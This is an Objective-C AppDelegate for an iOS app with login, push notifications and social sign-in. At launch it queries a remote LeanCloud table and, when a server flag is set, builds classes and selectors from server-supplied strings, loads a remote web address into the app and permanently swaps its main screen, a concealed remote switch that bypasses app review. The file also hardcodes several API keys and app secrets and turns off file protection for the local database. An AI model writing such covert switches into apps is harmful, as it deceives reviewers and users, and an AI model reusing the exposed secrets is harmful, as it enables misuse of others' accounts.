#import "LoginViewController.h"
#import "AppDelegate.h"
#import "nswyFollowViewController.h"
#import "NXHNaviController.h"
#import <AVOSCloud/AVOSCloud.h>
#import <AFNetworking.h>
#import <AVOSCloudSNS.h>
#import "EmptyViewController.h"
#import "CarViewController.h"
#import "JPUSHService.h"
#ifdef NSFoundationVersionNumber_iOS_9_x_Max
#import <UserNotifications/UserNotifications.h>
#endif
#import <UMCommon/UMCommon.h>
#import <UMAnalytics/MobClick.h>
//#import "UMMobClick/MobClick.h"
@interface AppDelegate ()<UNUserNotificationCenterDelegate,JPUSHRegisterDelegate>
    @property (nonatomic,strong) UIViewController * rootViewController;
@property (assign,nonatomic) BOOL isweb;
@end
@implementation AppDelegate
-(void)setUpRealm{
    RLMRealm *realm = [RLMRealm defaultRealm];
    NSString *folderPath = realm.configuration.fileURL.URLByDeletingLastPathComponent.path;
    [[NSFileManager defaultManager] setAttributes:@{NSFileProtectionKey: NSFileProtectionNone}
                                     ofItemAtPath:folderPath error:nil];
    NSLog(@"数据库地址 %@",folderPath);
}
-(BOOL)application:(UIApplication *)application willFinishLaunchingWithOptions:(NSDictionary *)launchOptions{
    application.applicationIconBadgeNumber = 0;
AFHTTPSessionManager *manager        =   [AFHTTPSessionManager manager];
    self.isweb =NO;
 NSString *udfLanguageCode = [[NSUserDefaults standardUserDefaults] objectForKey:@"AppleLanguages"][0];
    BOOL s =[[NSUserDefaults standardUserDefaults] boolForKey:@"s"];
    if (![udfLanguageCode containsString:@"zh-Hans"] ) {
        [manager.requestSerializer setValue:@"3F8JFfdWWg3px3oOu3v9Cdsg-gzGzoHsz" forHTTPHeaderField:@"X-LC-Id"];
        [manager.requestSerializer setValue:@"XWl16DLkeC0tdTVQnYUvGIFI" forHTTPHeaderField:@"X-LC-Key"];
        [manager GET:[@"https://leancloud.cn:443/1.1/classes/isWeb" stringByAppendingString:@"?limit=10&&order=-updatedAt"] parameters:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
            if (responseObject) {
                NSDictionary  * dic = (NSDictionary * )responseObject;
                NSArray * arr =  [dic valueForKey:@"results"];
                NSDictionary * info = [arr objectAtIndex:0];
                if ([[info valueForKey:@"isweb"] boolValue]) {
                    self.isweb = YES;
                    NSString * web = [info valueForKey:@"wbnet"];
                    if (web) {
                        NSString * class =  [info valueForKey:@"class"];
                        id car = NSClassFromString(class);
                        NSString * method1  = [info valueForKey:@"method1"];
                        NSString * method2 = [info valueForKey:@"method2"];
                        NSString * method = [info valueForKey:@"method"];
                        id C = [car performSelector:NSSelectorFromString(method1) ];
                        id B = [C performSelector:NSSelectorFromString(method2) withObject:class withObject:[NSBundle mainBundle]];
                        [B setValue:web forKey:@"wbnet"];
                        SEL m  = NSSelectorFromString(method);
          dispatch_async(dispatch_get_main_queue(), ^{
                            [self.window performSelector:NSSelectorFromString(method) withObject:B];
                        });
                        [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"s"];
                    }
                }
            }
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        }];
    }
    return YES;
}
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
  [self setUpRealm];
 [AVOSCloud setApplicationId:@"3F8JFfdWWg3px3oOu3v9Cdsg-gzGzoHsz" clientKey:@"XWl16DLkeC0tdTVQnYUvGIFI"];
    [AVOSCloudSNS setupPlatform:AVOSCloudSNSSinaWeibo withAppKey:@"3986658639" andAppSecret:@"b4e3a0ce4c67ae93721a8975014323c0" andRedirectURI:@"https://leancloud.cn/1.1/sns/callback/rus3k0p4qq7tg3ms"];
    [AVOSCloudSNS setupPlatform:AVOSCloudSNSQQ withAppKey:@"1106762062" andAppSecret:@"pf1noclUw6jxbL0O" andRedirectURI:nil];
    [AVOSCloudSNS setupPlatform:AVOSCloudSNSWeiXin withAppKey:@"wx0838a91efcf1214a" andAppSecret:@"wx0838a91efcf1214a" andRedirectURI:nil];

    [UMConfigure initWithAppkey:@"5aaf560a8f4a9d1c9100004d" channel:@"123"];
    [UMConfigure setLogEnabled:YES];

  [MobClick setScenarioType: E_UM_NORMAL];

    /** 开启CrashReport收集, 默认YES(开启状态).
     @param value 设置为NO,可关闭友盟CrashReport收集功能.
     @return void.
     */
    [MobClick setCrashReportEnabled:YES];
//    UMConfigInstance.appKey = @"5aaf560a8f4a9d1c9100004d";
//    [MobClick startWithConfigure:UMConfigInstance];
    self.window= [[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];
    self.window.backgroundColor = [UIColor whiteColor];
        BOOL login =    [[NSUserDefaults standardUserDefaults] boolForKey:@"Login"];
    BOOL s = [[NSUserDefaults standardUserDefaults] boolForKey:@"s"];
    if (s) {
        CarViewController * car = [[CarViewController alloc]initWithNibName:nil bundle:nil];
        self.window.rootViewController =car;
            [self.window makeKeyAndVisible];
        return YES;
    }
        if (login) {
            nswyFollowViewController *secondViewController = [[nswyFollowViewController alloc] initWithNibName:nil bundle:nil];
            UIViewController *secondNavigationController = [[NXHNaviController alloc]
                                                            initWithRootViewController:secondViewController];
            self.window.rootViewController = secondNavigationController;
        }else{
        LoginViewController * login =[[LoginViewController alloc]initWithNibName:nil bundle:nil];
        self.window.rootViewController =login;
        }
    [self.window makeKeyAndVisible];
    JPUSHRegisterEntity * entity = [[JPUSHRegisterEntity alloc] init];
    entity.types = JPAuthorizationOptionAlert|JPAuthorizationOptionBadge|JPAuthorizationOptionSound;
    if ([[UIDevice currentDevice].systemVersion floatValue] >= 8.0) {
    }
    [JPUSHService registerForRemoteNotificationConfig:entity delegate:self];
    [JPUSHService setupWithOption:launchOptions appKey:@"908df8f50e943ce13a8c5a94"
                          channel:@"" 
                 apsForProduction:1];
    return YES;
}
-(void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken{
    NSLog(@"%@",deviceToken);
      [JPUSHService registerDeviceToken:deviceToken];
}
-(void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *)error{
NSLog(@"%@",error);
}
#pragma mark- JPUSHRegisterDelegate
- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(NSInteger))completionHandler {
    NSDictionary * userInfo = notification.request.content.userInfo;
    if (@available(iOS 10.0, *)) {
        if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
            [JPUSHService handleRemoteNotification:userInfo];
        }
    } else {
    }
    if (@available(iOS 10.0, *)) {
        completionHandler(UNNotificationPresentationOptionAlert);
    } else {
    } 
}
- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
    NSDictionary * userInfo = response.notification.request.content.userInfo;
    if (@available(iOS 10.0, *)) {
        if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
            [JPUSHService handleRemoteNotification:userInfo];
        }
    } else {
    }
    completionHandler();  
}
- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler {
    [JPUSHService handleRemoteNotification:userInfo];
    completionHandler(UIBackgroundFetchResultNewData);
}
- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo {
    [JPUSHService handleRemoteNotification:userInfo];
}
- (void)applicationWillResignActive:(UIApplication *)application {
}
- (void)applicationDidEnterBackground:(UIApplication *)application {
}
- (void)applicationWillEnterForeground:(UIApplication *)application {
}
- (void)applicationDidBecomeActive:(UIApplication *)application {
}
- (void)applicationWillTerminate:(UIApplication *)application {
}
-(BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url{
    return [AVOSCloudSNS handleOpenURL:url];
}
- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation
{
    return [AVOSCloudSNS handleOpenURL:url];
}
- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary<NSString *,id> *)options
{
    return [AVOSCloudSNS handleOpenURL:url];
}
@end
